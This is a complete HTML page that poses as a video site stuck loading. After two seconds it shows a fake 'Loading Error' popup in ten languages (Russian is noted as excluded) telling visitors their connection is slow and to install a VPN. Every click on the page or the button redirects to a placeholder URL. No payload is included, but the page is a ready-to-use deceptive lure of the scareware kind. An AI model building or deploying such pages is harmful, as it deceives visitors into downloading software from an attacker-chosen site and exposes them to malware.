
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Page - Loading Error</title>
    <style>
        /* Base styles for the page layout */
        body {
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        /* Video container layout */
        .video-container {
            width: 95%;
            height: 95%;
            background-color: #e0e0e0;
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            grid-template-rows: auto;
            gap: 10px;
            padding: 15px;
            position: relative;
            overflow-y: auto;
        }

        /* Style for large video placeholder */
        .large-video-placeholder {
            grid-column: span 4;
            height: 250px;
            background: linear-gradient(90deg, #d3d3d3 25%, #c0c0c0 50%, #d3d3d3 75%);
            background-size: 200% 100%;
            animation: loading 1.5s infinite;
            border-radius: 5px;
        }

        /* Style for smaller video thumbnails */
        .video-placeholder {
            height: 150px;
            background: linear-gradient(90deg, #d3d3d3 25%, #c0c0c0 50%, #d3d3d3 75%);
            background-size: 200% 100%;
            animation: loading 1.5s infinite;
            border-radius: 5px;
        }

        /* Placeholder for movie title and description */
        .text-placeholder {
            grid-column: span 2;
            height: 20px;
            background: linear-gradient(90deg, #e0e0e0 25%, #c0c0c0 50%, #e0e0e0 75%);
            background-size: 200% 100%;
            animation: loading 1.5s infinite;
            border-radius: 3px;
            margin-top: 5px;
        }

        .text-placeholder-full {
            grid-column: span 4;
            height: 30px;
            background: linear-gradient(90deg, #e0e0e0 25%, #c0c0c0 50%, #e0e0e0 75%);
            background-size: 200% 100%;
            animation: loading 1.5s infinite;
            border-radius: 3px;
            margin-top: 8px;
        }

        /* Animation for loading effect */
        @keyframes loading {
            0% {
                background-position: 200% 0;
            }
            100% {
                background-position: -200% 0;
            }
        }

        /* Popup modal styling */
        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 340px;
            padding: 20px;

            background: rgba(255, 255, 255, 0.95);
            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            z-index: 1000;
            display: none;
            text-align: center;
        }

        .popup h2 {
            margin: 0;
            font-size: 1.6rem;
            color: #333;
        }

        .popup p {
            margin: 10px 0;
            font-size: 1.1rem;
            color: #555;
        }

        .popup button {
            margin-top: 15px;
            padding: 12px 24px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: background 0.3s;
        }

        .popup button:hover {
            background-color: #357ae8;
        }

        /* Responsive design for mobile */
        @media (max-width: 768px) {
            .video-container {
                grid-template-columns: repeat(2, 1fr);
            }

            .large-video-placeholder {
                height: 200px;
            }

            .video-placeholder {
                height: 120px;
            }

            .text-placeholder, .text-placeholder-full {
                height: 18px;
            }

            .popup {
                width: 280px;
                padding: 15px;
            }

            .popup h2 {
                font-size: 1.4rem;
            }

            .popup p {
                font-size: 1rem;
            }

            .popup button {
                padding: 10px 20px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <!-- Simulated video loading page -->
    <div class="video-container" id="videoContainer">
        <!-- Large main video placeholder -->
        <div class="large-video-placeholder"></div>

        <!-- Additional video placeholders for more realistic loading screen -->
        <div class="video-placeholder"></div>
        <div class="video-placeholder"></div>
        <div class="video-placeholder"></div>
        <div class="video-placeholder"></div>

        <!-- Text placeholders for movie titles and descriptions -->
        <div class="text-placeholder-full"></div>
        <div class="text-placeholder"></div>
        <div class="text-placeholder"></div>

        <div class="video-placeholder"></div>
        <div class="video-placeholder"></div>
        <div class="video-placeholder"></div>
        <div class="video-placeholder"></div>

        <div class="text-placeholder-full"></div>
        <div class="text-placeholder"></div>
        <div class="text-placeholder"></div>
    </div>

    <!-- Popup modal -->
    <div class="popup" id="popupModal">
        <h2 id="popupTitle">Loading Error</h2>
        <p id="popupMessage">Your connection is slow. Install a VPN for faster browsing.</p>
        <button id="installButton" onclick="installVPN()">Install VPN</button>
    </div>

    <!-- JavaScript for page functionality -->
    <script>
        // Translations object for 10 languages (excluding Russian)
        const translations = {
            en: { title: 'Loading Error', message: 'Your connection is slow. Install a VPN for faster browsing.', button: 'Install VPN' },
            es: { title: 'Error de carga', message: 'Tu conexión es lenta. Instala un VPN para una navegación más rápida.', button: 'Instalar VPN' },
            fr: { title: 'Erreur de chargement', message: 'Votre connexion est lente. Installez un VPN pour une navigation plus rapide.', button: 'Installer le VPN' },
            de: { title: 'Ladefehler', message: 'Ihre Verbindung ist langsam. Installieren Sie ein VPN für schnelleres Surfen.', button: 'VPN installieren' },
            zh: { title: '加载错误', message: '您的连接很慢。安装VPN以加快浏览速度。', button: '安装VPN' },
            ar: { title: 'خطأ في التحميل', message: 'اتصالك بطيء. قم بتثبيت VPN لتصفح أسرع.', button: 'تثبيت VPN' },
            it: { title: 'Errore di caricamento', message: 'La tua connessione è lenta. Installa una VPN per navigare più velocemente.', button: 'Installa VPN' },
            pt: { title: 'Erro de Carregamento', message: 'Sua conexão está lenta. Instale um VPN para uma navegação mais rápida.', button: 'Instalar VPN' },
            ja: { title: '読み込みエラー', message: '接続が遅いです。VPNをインストールしてブラウジングを高速化してください。', button: 'VPNをインストール' },
            hi: { title: 'लोडिंग त्रुटि', message: 'आपका कनेक्शन धीमा है। तेज ब्राउज़िंग के लिए VPN स्थापित करें।', button: 'VPN स्थापित करें' }
        };

        // Get user's language preference
        const userLang = navigator.language.slice(0, 2);
        const defaultLang = 'en';
        const language = translations[userLang] ? userLang : defaultLang;

        // Apply translations
        document.getElementById('popupTitle').textContent = translations[language].title;
        document.getElementById('popupMessage').textContent = translations[language].message;
        document.getElementById('installButton').textContent = translations[language].button;

        // Redirect on body click
        document.body.addEventListener('click', () => {
            window.location.href = 'https://example.com';
        });

        // Function for the "Install VPN" button
        function installVPN() {
            window.location.href = 'https://example.com';
        }

        // Show the popup after 2 seconds
        setTimeout(() => {
            document.getElementById('popupModal').style.display = 'block';
        }, 2000);
    </script>
</body>
</html>
